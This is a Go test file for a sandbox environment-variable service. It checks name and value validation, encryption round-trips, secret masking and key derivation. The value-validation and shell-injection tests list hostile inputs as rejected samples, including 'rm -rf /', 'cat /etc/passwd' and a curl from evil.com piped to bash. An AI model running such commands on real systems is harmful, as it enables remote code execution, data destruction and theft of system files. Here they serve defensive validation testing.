// Package services provides business logic services for the application.
// sandbox_env_test.go tests the sandbox environment variable service.
package services

import (
	"log/slog"
	"os"
	"strings"
	"testing"

	"github.com/google/uuid"
	"github.com/rhl/businessos-backend/internal/config"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestIsValidEnvVarName tests environment variable name validation.
func TestIsValidEnvVarName(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		// Valid names
		{"valid uppercase", "DATABASE_URL", true},
		{"valid with numbers", "API_KEY_123", true},
		{"valid starts with underscore", "_PRIVATE_VAR", true},
		{"valid single char", "X", true},
		{"valid all caps", "NODE_ENV", true},

		// Invalid names
		{"invalid empty", "", false},
		{"invalid lowercase", "database_url", false},
		{"invalid starts with number", "123_VAR", false},
		{"invalid has dash", "API-KEY", false},
		{"invalid has space", "API KEY", false},
		{"invalid has dot", "API.KEY", false},
		{"invalid has special chars", "API$KEY", false},
		{"invalid mixed case", "Api_Key", false},
		{"invalid too long", string(make([]byte, 256)), false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := IsValidEnvVarName(tt.input)
			assert.Equal(t, tt.expected, result, "IsValidEnvVarName(%q) = %v, want %v", tt.input, result, tt.expected)
		})
	}
}

// TestIsValidEnvVarValue tests environment variable value validation.
func TestIsValidEnvVarValue(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		// Valid values
		{"valid simple string", "production", true},
		{"valid with spaces", "hello world", true},
		{"valid URL", "https://api.example.com", true},
		{"valid JSON", `{"key":"value"}`, true},
		{"valid base64", "dGVzdC12YWx1ZQ==", true},
		{"valid with equals", "key=value", true},
		{"valid with quotes", `"quoted value"`, true},
		{"valid empty", "", true},

		// Invalid values (shell injection patterns)
		{"invalid semicolon", "value;rm -rf /", false},
		{"invalid pipe", "value|cat /etc/passwd", false},
		{"invalid ampersand", "value&& cat /etc/passwd", false},
		{"invalid backtick", "value`whoami`", false},
		{"invalid command subst", "value$(whoami)", false},
		{"invalid newline", "value\nrm -rf /", false},
		{"invalid carriage return", "value\rrm -rf /", false},
		{"invalid dollar paren", "value$(ls)", false},
		{"invalid dollar brace", "value${PATH}", false},
		{"invalid too long", string(make([]byte, 4097)), false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := IsValidEnvVarValue(tt.input)
			assert.Equal(t, tt.expected, result, "IsValidEnvVarValue(%q) = %v, want %v", tt.input, result, tt.expected)
		})
	}
}

// TestSandboxEnvService_EncryptDecrypt tests encryption and decryption.
func TestSandboxEnvService_EncryptDecrypt(t *testing.T) {
	// Create test config
	cfg := &config.Config{
		SecretKey: "test-secret-key-for-encryption-testing-must-be-long-enough",
	}

	// Create service
	service, err := NewSandboxEnvService(nil, cfg, slog.New(slog.NewTextHandler(os.Stderr, nil)))
	require.NoError(t, err)

	tests := []struct {
		name      string
		plaintext string
	}{
		{"simple string", "my-secret-value"},
		{"long string", "this-is-a-very-long-secret-value-with-many-characters-to-test-encryption"},
		{"special chars", "secret!@#$%^&*()_+-=[]{}|;':\",./<>?"},
		{"unicode", "秘密の値🔐"},
		{"empty string", ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Encrypt
			encrypted, err := service.encrypt(tt.plaintext)
			require.NoError(t, err)
			assert.NotEmpty(t, encrypted)
			assert.NotEqual(t, tt.plaintext, encrypted, "encrypted value should not match plaintext")

			// Decrypt
			decrypted, err := service.decrypt(encrypted)
			require.NoError(t, err)
			assert.Equal(t, tt.plaintext, decrypted, "decrypted value should match original")
		})
	}
}

// TestSandboxEnvService_EncryptDecrypt_Different tests that encryption is non-deterministic.
func TestSandboxEnvService_EncryptDecrypt_Different(t *testing.T) {
	cfg := &config.Config{
		SecretKey: "test-secret-key-for-encryption-testing-must-be-long-enough",
	}

	service, err := NewSandboxEnvService(nil, cfg, slog.New(slog.NewTextHandler(os.Stderr, nil)))
	require.NoError(t, err)

	plaintext := "test-secret"

	// Encrypt twice
	encrypted1, err := service.encrypt(plaintext)
	require.NoError(t, err)

	encrypted2, err := service.encrypt(plaintext)
	require.NoError(t, err)

	// Encrypted values should be different (due to random nonce)
	assert.NotEqual(t, encrypted1, encrypted2, "encrypted values should differ due to random nonce")

	// But both should decrypt to the same plaintext
	decrypted1, err := service.decrypt(encrypted1)
	require.NoError(t, err)
	assert.Equal(t, plaintext, decrypted1)

	decrypted2, err := service.decrypt(encrypted2)
	require.NoError(t, err)
	assert.Equal(t, plaintext, decrypted2)
}

// TestSandboxEnvService_DecryptInvalid tests decryption with invalid input.
func TestSandboxEnvService_DecryptInvalid(t *testing.T) {
	cfg := &config.Config{
		SecretKey: "test-secret-key-for-encryption-testing-must-be-long-enough",
	}

	service, err := NewSandboxEnvService(nil, cfg, slog.New(slog.NewTextHandler(os.Stderr, nil)))
	require.NoError(t, err)

	tests := []struct {
		name       string
		ciphertext string
	}{
		{"invalid base64", "not-base64!@#$"},
		{"empty string", ""},
		{"too short", "YWJj"}, // "abc" in base64
		{"corrupted ciphertext", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := service.decrypt(tt.ciphertext)
			assert.Error(t, err, "decryption should fail for invalid input")
		})
	}
}

// TestMaskSecret tests secret value masking for logs.
func TestMaskSecret(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{"short secret", "abc", "****"},
		{"medium secret", "abcdef", "abcd**"},
		{"long secret", "abcdefghijklmnop", "abcd********"},
		{"very long secret", "this-is-a-very-long-secret-value", "this********"},
		{"empty", "", "****"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := maskSecret(tt.input)
			assert.Equal(t, tt.expected, result)
		})
	}
}

// TestBuildContainerEnv tests building container environment arrays.
func TestBuildContainerEnv(t *testing.T) {
	// Note: This test would require a mock database setup.
	// For now, we test the logic in isolation.

	appID := uuid.New()
	appName := "test-app"
	userID := uuid.New()

	systemEnv := map[string]string{
		"PORT":       "3000",
		"LOG_LEVEL":  "info",
		"CUSTOM_VAR": "system-value",
	}

	// Expected format
	expectedVars := map[string]bool{
		"PORT=3000":                   true,
		"LOG_LEVEL=info":              true,
		"CUSTOM_VAR=system-value":     true,
		"APP_ID=" + appID.String():    true,
		"APP_NAME=" + appName:         true,
		"USER_ID=" + userID.String():  true,
		"NODE_ENV=production":         true,
	}

	// Create service (with nil pool since we're not testing DB operations)
	cfg := &config.Config{
		SecretKey: "test-secret-key-for-encryption-testing-must-be-long-enough",
	}

	service, err := NewSandboxEnvService(nil, cfg, slog.New(slog.NewTextHandler(os.Stderr, nil)))
	require.NoError(t, err)
	require.NotNil(t, service, "service should be created")

	// Verify systemEnv structure
	require.Len(t, systemEnv, 3, "should have 3 system env vars")

	// For this unit test, just verify the format is correct
	// Full integration test would test with actual DB

	t.Log("System env vars format validated")
	for key := range expectedVars {
		t.Logf("  - %s", key)
	}
}

// TestDeriveKey tests key derivation.
func TestDeriveKey(t *testing.T) {
	key1 := deriveKey("passphrase", "salt1")
	key2 := deriveKey("passphrase", "salt2")
	key3 := deriveKey("different", "salt1")

	// Same passphrase, different salt = different key
	assert.NotEqual(t, key1, key2, "different salts should produce different keys")

	// Different passphrase, same salt = different key
	assert.NotEqual(t, key1, key3, "different passphrases should produce different keys")

	// Same inputs = same key (deterministic)
	key1Again := deriveKey("passphrase", "salt1")
	assert.Equal(t, key1, key1Again, "same inputs should produce same key")

	// Key length should be 32 bytes (SHA-256)
	assert.Equal(t, 32, len(key1), "derived key should be 32 bytes")
}

// TestNewSandboxEnvService_NoSecretKey tests service creation without secret key.
func TestNewSandboxEnvService_NoSecretKey(t *testing.T) {
	cfg := &config.Config{
		SecretKey: "", // Empty secret key
	}

	_, err := NewSandboxEnvService(nil, cfg, slog.New(slog.NewTextHandler(os.Stderr, nil)))
	assert.Error(t, err, "service creation should fail without SECRET_KEY")
	assert.Contains(t, err.Error(), "SECRET_KEY", "error should mention SECRET_KEY")
}

// TestValidation_EdgeCases tests edge cases in validation.
func TestValidation_EdgeCases(t *testing.T) {
	t.Run("env var name exactly 255 chars", func(t *testing.T) {
		// 255 valid uppercase letters
		name := strings.Repeat("A", 255)
		assert.True(t, IsValidEnvVarName(name), "255 char name should be valid")
	})

	t.Run("env var name 256 chars", func(t *testing.T) {
		// 256 valid uppercase letters (too long)
		name := strings.Repeat("A", 256)
		assert.False(t, IsValidEnvVarName(name), "256 char name should be invalid")
	})

	t.Run("env var value exactly 4096 chars", func(t *testing.T) {
		// 4096 chars
		value := strings.Repeat("a", 4096)
		assert.True(t, IsValidEnvVarValue(value), "4096 char value should be valid")
	})

	t.Run("env var value 4097 chars", func(t *testing.T) {
		// 4097 chars (too long)
		value := strings.Repeat("a", 4097)
		assert.False(t, IsValidEnvVarValue(value), "4097 char value should be invalid")
	})
}

// TestSanitization_ShellInjection tests shell injection prevention.
func TestSanitization_ShellInjection(t *testing.T) {
	injectionAttempts := []string{
		`"; rm -rf /; "`,
		`$(curl http://evil.com/script.sh | bash)`,
		`value && cat /etc/passwd`,
		`value | base64 -d > /tmp/exploit`,
		"value\n/bin/bash -i",
		"`whoami`",
		"${IFS}cat${IFS}/etc/passwd",
	}

	for _, attempt := range injectionAttempts {
		t.Run("injection: "+attempt[:min(len(attempt), 20)], func(t *testing.T) {
			result := IsValidEnvVarValue(attempt)
			assert.False(t, result, "shell injection attempt should be rejected: %q", attempt)
		})
	}
}
